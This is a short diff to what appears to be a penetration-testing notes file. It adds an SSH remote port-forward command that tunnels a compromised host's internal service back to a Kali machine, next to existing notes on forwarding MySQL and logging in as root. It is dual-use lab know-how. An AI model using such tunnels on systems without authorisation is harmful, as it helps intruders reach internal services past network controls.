@@ -1018,6 +1018,8 @@ exit
 ```bash
 ssh -R <mykali-port>127:0.0.1:<service-port> <username>@<local-machine>
 ssh -R 4444:127.0.0.1:3306 kali@192.168.x.x
+ssh -R 127.0.0.1:2345:127.0.0.1:8000 kali@192.168.45.176
+
 mysql -u root -h 127.0.0.1 -P 4444
 select @@hostname;
 ```
